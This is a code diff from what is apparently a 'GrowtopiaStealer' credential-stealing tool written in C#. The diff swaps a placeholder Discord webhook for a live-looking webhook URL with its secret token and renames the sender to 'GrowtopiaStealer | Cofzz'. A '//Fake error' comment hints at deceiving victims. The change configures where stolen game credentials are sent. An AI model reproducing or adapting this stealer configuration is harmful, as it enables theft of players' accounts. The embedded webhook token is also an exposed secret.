@@ -7,9 +7,9 @@ using System.Text;
 public class DiscordWebhook // https://github.com/TheC0mpany/GrowtopiaStealer that code from https://github.com/MorganSkilly/Unity-Discord-Webhook-System/blob/main/Discord.cs
 {
     //CHANGE THESE!
-    public static string defaultWebhook = "https://discord.com/api/webhooks/123124122313/amogus";
+    public static string defaultWebhook = "https://discord.com/api/webhooks/1097136056287105084/cULWmaUTxStpottNokPxOvVzkyN7ofZ77m2Ao_CoU-GxzpuW-xXDJxfWiYKTUGATzHUh";
     private static string defaultUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
-    public static string defaultUserName = "GrowtopiaStealer | TheC0mpany";
+    public static string defaultUserName = "GrowtopiaStealer | Cofzz";
     public static string defaultAvatar = "https://i.imgur.com/2Via1dY.jpg"; // Avatar
 
     //Fake error
